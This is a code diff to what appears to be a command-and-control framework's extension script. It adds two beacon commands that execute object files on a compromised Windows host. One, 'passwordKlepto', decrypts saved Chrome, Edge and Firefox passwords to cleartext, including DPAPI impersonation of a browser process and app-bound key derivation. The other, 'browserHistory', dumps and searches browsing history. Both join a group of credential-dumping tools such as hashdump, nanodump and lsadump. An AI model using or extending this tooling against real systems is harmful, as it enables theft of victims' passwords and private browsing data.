@@ -303,8 +303,56 @@ cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 
 
 
+var cmd_password_klepto = ax.create_command("passwordKlepto", "Decrypt stored Chrome/Edge/Firefox passwords to cleartext in-process", "passwordKlepto [-b [chrome || msedge || firefox || all]] [-p pid] [--no-v20] [--no-firefox]");
+cmd_password_klepto.addArgFlagString("-b", "browser",   "Target 'chrome', 'msedge', 'firefox' or 'all' (default all)", "");
+cmd_password_klepto.addArgFlagInt(   "-p", "pid",        "Browser PID to impersonate for DPAPI when the beacon is SYSTEM (0 = none)", 0);
+cmd_password_klepto.addArgBool(      "--no-v20",        "Skip the app-bound v20 key derivation (v10 only for Chrome/Edge)");
+cmd_password_klepto.addArgBool(      "--no-firefox",   "Skip Firefox when running against 'all'");
+cmd_password_klepto.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
+{
+    let browser = parsed_json["browser"];
+    let pid     = parsed_json["pid"];
+    let doV20   = parsed_json["--no-v20"]      ? 0 : 1;
+    let doFf    = parsed_json["--no-firefox"]  ? 0 : 1;
+
+    if (browser.length > 0 && browser != "chrome" && browser != "msedge" && browser != "firefox" && browser != "all") {
+        throw new Error("Target 'chrome', 'msedge', 'firefox' or 'all' only !");
+    }
+    if (browser == "all") browser = "";
+
+    // go() parse order: browser(cstr), profileOverride(cstr), pid(int), doV20(int), doFirefox(int)
+    let bof_path = ax.script_dir() + "_bin/passwordKlepto." + ax.arch(id) + ".o";
+    let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [ browser, "", pid, doV20, doFf ]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Running passwordKlepto BOF");
+});
+
+
+
+var cmd_browser_history = ax.create_command("browserHistory", "Search and display Chrome/Edge/Firefox browsing history in-process", "browserHistory [-b [chrome || msedge || firefox || all]] [-k keyword] [-l limit]");
+cmd_browser_history.addArgFlagString("-b", "browser", "Target 'chrome', 'msedge', 'firefox' or 'all' (default all)", "");
+cmd_browser_history.addArgFlagString("-k", "keyword", "Case-insensitive substring to filter URL/title (empty = show all)", "");
+cmd_browser_history.addArgFlagInt(   "-l", "limit",    "Max rows to print per profile (0 = default 50)", 0);
+cmd_browser_history.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
+{
+    let browser = parsed_json["browser"];
+    let keyword = parsed_json["keyword"];
+    let limit   = parsed_json["limit"];
+
+    if (browser.length > 0 && browser != "chrome" && browser != "msedge" && browser != "firefox" && browser != "all") {
+        throw new Error("Target 'chrome', 'msedge', 'firefox' or 'all' only !");
+    }
+    if (browser == "all") browser = "";
+
+    // go() parse order: browser(cstr), keyword(cstr), limit(int)
+    let bof_path = ax.script_dir() + "_bin/browserHistory." + ax.arch(id) + ".o";
+    let bof_params = ax.bof_pack("cstr,cstr,int", [ browser, keyword || "", limit ]);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Running browserHistory BOF");
+});
+
+
+
 var group_test = ax.create_commands_group("Creds-BOF", [
-    cmd_askcreds, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster,
+    cmd_askcreds, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster, cmd_password_klepto, cmd_browser_history,
     cmd_nanodump, cmd_nanodump_ppl_dump, cmd_nanodump_ppl_medic, cmd_nanodump_ssp, cmd_underlaycopy,
     cmd_lsadump_secrets, cmd_lsadump_sam, cmd_lsadump_cache
 ]);
